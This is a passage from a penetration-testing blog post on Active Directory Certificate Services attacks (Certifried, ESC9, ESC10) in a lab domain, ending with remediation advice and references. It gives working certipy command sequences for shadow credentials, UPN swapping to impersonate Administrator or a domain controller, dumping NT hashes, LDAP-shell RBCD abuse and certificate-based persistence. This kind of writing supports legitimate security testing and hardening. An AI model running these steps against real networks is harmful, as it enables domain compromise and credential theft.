<img src="/images/2022-09-16/certifried1.png">  

<img src="/images/2022-09-16/certifried2.png">  

If we now request a cert as the computer, it will be issued for test.mcafeelab.local as the ``dNSHostName`` is used, as explained before.  

<img src="/images/2022-09-16/certifried3.png">  

The fun thing now is, that in contrast to the ``UPN``, the ``dNSHostName`` doesn't need to be unique :)  
But you can't simply swap your DNS name to dc2016.mcafeelab.local, as this again raises an error because when we update the value, AD automatically wants to also update the ``SPN`` of the object, which again needs to be unique:  

<img src="/images/2022-09-16/certifried4.png">  

Lucky for us, a creator of a computer object also has the ``Validated write to service principal name`` rights, so we can alter them as well.  
As can be seen in the picture above, only the values for the SPNs with the FQDN changed. The ones that don't, still have like ``HOST/WIN10X64`` (without a $ at the end), not reflecting the changes to ``test.mcafeelab.local``. If we delete the FQDN entries of our computer, we can alter the DNS property to our liking:  

Before  
<img src="/images/2022-09-16/certifried5.png">  

After altering we can set the DNS name without an error and request a cert with the new name  

<img src="/images/2022-09-16/certifried6.png">  

<img src="/images/2022-09-16/certifried7.png">  

<img src="/images/2022-09-16/certifried8.png">  

We can finally authenticate as the DC and fetch the NT hash for PTH or whatever:  

<img src="/images/2022-09-16/certifried9.png">  

As we can see, the cert was issued to ``DC2016$@mcafeelab.local`` - name + ``$``. This is because the mapping of the cert to an account first tries to match the principal name in the AS-REQ package. If not found, the SAN, UPN or DNS name are the next reference for a match. During PKINIT auth the trailing ``$`` from the principal name is stripped and the name matched to the ``SAMAccountName`` with a traling ``$``. Please read the [PKINIT & Certificate Mapping](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) part of Oliver's research to fully dig it.  

To fix the Certifried attack vector, Microsoft implemented some countermeasures. One of them is a new security extension called ``szOID_NTDS_CA_SECURITY_EXT`` which embeds the ``objectSid`` of the requester into the cert.  
Additionally MS added 2 reg keys:  

```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel CertificateMappingMethods 
and
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement
```

The ``CertificateMappingMethods`` setting describes how ``Schannel`` (instead of Kerberos) handles authentication.  

If ``StrongCertificateBindingEnforcement`` is set to 0, no strong mapping checks are performed and the new ``szOID_NTDS_CA_SECURITY_EXT`` extension is ignored globally.  
The newly introduced "features" of MS caused a lot of trouble, so admins were advised to revert the changes by setting the regkeys back to 0. 

## ESC9

If you want to fully understand, please read Oliver's [research](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7).  

The main part is this that certs get mapped in a certain way:  

> If the certificate contains a UPN with the value john@corp.local, the KDC will first try to see if there exists a user with a userPrincipalName property value that matches. If not, it checks if the domain part corp.local matches the Active Directory domain. If there is no domain part in the UPN SAN, i.e. the UPN is just john, then no validation is performed. Next, it will try to map the user part john to an account where the sAMAccountName property matches. If this also fails, it will try to add a $ to the end of the user part, i.e. john$, and try the previous step again (sAMAccountName). This means that a certificate with a UPN value can actually be mapped to a machine account.

> If the certificate contains a DNS SAN and not a UPN SAN, then the KDC will split the DNS name into a user part and a domain part, i.e. johnpc.corp.local becomes johnpc and corp.local. The domain part is then validated to match the Active Directory domain, and the user part will be appended by a $ and then mapped to an account where the sAMAccountName property matches, i.e. johnpc will be looked up as johnpc$.


### Recon 

There is a new ``msPKI-Enrollment-Flag`` available:  ``CT_FLAG_NO_SECURITY_EXTENSION (0x80000)``. This allows to disable the ``szOID_NTDS_CA_SECURITY_EXT`` extension for a single template.  

```
certutil -dstemplate ESC9 msPKI-Enrollment-Flag
```

<img src="/images/2022-09-16/esc9_recon1.png">   


ESC9 is only useful when ``StrongCertificateBindingEnforcement`` is set to 1 = KDC checks if there is strong cert mapping applied to the cert. If yes it grants access. If not it checks if the cert contains the new SID extension and validates it. If check ok access is granted, otherwise declined. If the extension is completely missing, access is granted if the account requesting the cert is older than the cert.  

If the affected cert template additionally allows for client authentication and we have ``GenericWrite`` over another account, we can carry out the attack.  

<img src="/images/2022-09-16/ESC9_1.png">  

### Exploitation

We first obtain the hash of the user we have ``GenericWrite`` rights for, in this case with the Shadow Credentials attack:  

```
certipy shadow auto -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -account ds
```

<img src="/images/2022-09-16/ESC9_2.png">  

Now we change the UPN of ``ds`` to be ``Administrator``:  

```
certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn Administrator
```

<img src="/images/2022-09-16/ESC9_3.png">  

<img src="/images/2022-09-16/ESC9_4.png">  

Next we need to request a TGT as the ``ds`` user, which will give us a TGT with Administrator as ``UPN``:  

```
certipy req -u 'ds@mcafeelab.local' -hashes a690...7931 -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template ESC9
```

<img src="/images/2022-09-16/ESC9_5.png">  

Now we need to revert the ``UPN`` settings on the ``ds`` account back to it's default value:  

```
certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn ds@mcafeelab.local
```

<img src="/images/2022-09-16/ESC9_6.png">  

<img src="/images/2022-09-16/ESC9_7.png">  

Lastly we can now request a TGT with our ticket which has the ``Administrator UPN``, which will resolve to the ``Administrator@mcafeelab.local`` acount now:  

```
certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -domain mcafeelab.local
```

<img src="/images/2022-09-16/ESC9_8.png">  

## ESC10

So the last one in the list talks about the case when the global parameter ``StrongCertificateBindingEnforcement`` = 0 - so all templates are ignoring the ``szOID_NTDS_CA_SECURITY_EXT`` setting.  
The other prerequisit again is, that we have ``GenericWrite`` over another account.  

### Recon

Query the accordings registry key locally or remotely.  
``HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`` 

### Exploitation  

These are the same steps as in [ESC9](#esc9), with the addition, that we can enroll in **ANY** cert that has ``Client Authentication`` enabled.  
  
  
But wait there is more...  
<img src="/images/2022-09-16/more_meme.png">   
  
There is a 2nd scenario when Schannel is used instead of Kerberos, with a slight difference. This time instead of the ``StrongCertificateBindingEnforcement`` being disabled, we have the ``CertificateMappingMethods`` containing the ``UPN`` bit flag of ``0x4`` - SAN certificate mapping.  
This is the equivalent to the ``szOID_NTDS_CA_SECURITY_EXT`` extension for Kerberos, which can't be applied to ``Schannel``.  
Again, if you need more info, please read Oliver's research, especially the ``Schannel Certificate Mapping`` part.  

We again need an account with ``GenericWrite`` over another account, this time one that doesn't have an ``UPN`` - which is all machine accounts and the built in Administrator.  
We'll use the same two account from the example before.  

### Recon

Query the accordings registry key locally or remotely.  
``HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods ``

### Exploitation

First we need the NT hash of our attacked user:  

```
certipy shadow auto -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -account ds
```

Then we change the ``UPN`` of the ``ds`` user to ``DC2016$.mcafeelab.local``:  

```
certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn 'DC2016$@mcafeelab.local'
```

No we enroll into any cert that allows client auth as ``ds``:  

```
certipy req -u 'ds@mcafeelab.local' -hashes a69...931 -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template User
```

Change back the ``UPN`` to the default value:  

```
certipy account update -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -user ds -upn 'ds@mcafeelab.local' 
```

And lastly jump into an ldap shell via ``Schannel`` and do some RBCD fun:  

```
certipy auth -pfx 'dc2016.pfx' -dc-ip '10.55.0.2' -ldap-shell
set_rbcd DC2016$ evil123$
```

<img src="/images/2022-09-16/ESC10_1.png">  

## Bonus

### Persistence  

The cool thing about certs is that by default they have a lifetime of 1 year. So no matter how often changed or how complex a password is, the cert will always grant you access to a TGT and / or the current NT hash. Just request a cert with the NT hash or password and enjoy longtime access:  

<img src="/images/2022-09-16/extra.png">  

https://twitter.com/theluemmel/status/1572478359619211266  

### Bloodhound integration  

Again a cool feature from Certipy. You can export the findings of Certipy to Bloodhound with the ``-old-bloodhound`` switch:  

```
certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -old-bloodhound
```

<img src="/images/2022-09-16/bonus_bh1.png">    

We can then e.g. look for attacks paths for some of the ESC examples like ESC6 after importing Oliver's [custom queries](https://github.com/ly4k/Certipy/blob/main/customqueries.json) for Bloodhound:  

<img src="/images/2022-09-16/bonus_bh2.png">    

If you use Oliver's [fork](https://github.com/ly4k/BloodHound/) of Bloodhound, you can even find more ways for privesc via certs. Go read his [blog](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6#ESC4%20—%20Vulnerable%20Certificate%20Template%20Access%20Control).  

# Remediation  

Generally speaking, check your PKI infrastructure and use the tools and tips provided. Update regularly. Challenge regularly.    

ESC1: When you really need to have the enrolee supply the SAN, at least activate ``Manager Approval`` or restrict the users who can enroll. Better turn it off completely.  
ESC2: If you need those cert templates, make use of the ``Manager Approval`` or restrict the users who can enroll.   
ESC3: Restrict the users who can enroll. Restrict users who can become EnrollemntAgents.  
ESC4: Review the ACLs on the templates and remove unneccessary access rights.  
ESC5: Review all other ACLs in your PKI and restrict as much as possible  
ESC6: Apply patch for CVE-2022–26923  
ESC7: Review ACLs on the PKI itself and remove unwanted access rights  
ESC8: Enable HTTPS on your enrollment endpoint and disable NTLM auth or remove it completely.  
Certifried: Apply patch for CVE-2022–26923  
ESC9: Set ``StrongCertificateBindingEnforcement`` = 2 and/or remove the ``msPKI-Enrollment-Flag`` from the affected template -> ``certutil -dstemplate ESC9 msPKI-Enrollment-Flag -0x00080000``    
ESC10: Remove the 0x4 bit from the ``CertificateMappingMethods`` setting in the registry  

# Resources & Credits  

Thx to [Will Schroeder](https://twitter.com/harmj0y), [Lee Christensen](https://twitter.com/tifkin_) and [Oliver Lyak](https://twitter.com/ly4k_) for their research, tools and sharing of information regarding ADCS vulns.  
I also want to give a huge shout out to [Charly Bromberg](https://twitter.com/_nwodtuhs) and [snovvcrash](https://twitter.com/snovvcrash), who do such outstanding jobs with the [Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs) and [snovvcrash.rocks](https://ppn.snovvcrash.rocks/). Everything is documented step by step, reduced to the absolut minimum you need to pwn and understand things.  
Thx to all the others I forgot to mention, but which's info, tools and writeups I used. I love you guys.  


## All the stuff I used for my "research" in absolutely chaotic order:  

UPDATE 10.11.2022:  
SpecterOps released a new blog taking several scenarios with abuse cases and MS patchtes into cosideration -> https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d  

https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc1  
https://github.com/GhostPack/Certify  
https://github.com/ly4k/Certipy  
https://www.thehacker.recipes/ad/movement/ad-cs  
https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate  
https://www.thehacker.recipes/ad/movement/ad-cs#attack-paths  
https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf  
https://posts.specterops.io/certified-pre-owned-d95910965cd2  
ESC4: https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates  
https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7  
https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4   
https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6  
https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services  
https://github.com/bats3c/ADCSPwn  
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate  
https://www.powershellgallery.com/packages/PSPKI/3.7.2  
https://www.pkisolutions.com/tools/pspki/  
https://blog.netwrix.com/2021/08/24/active-directory-certificate-services-risky-settings-and-how-to-remediate-them/  
https://www.thehacker.recipes/ad/movement/ad-cs/certifried  
https://www.gradenegger.eu/?p=18373  
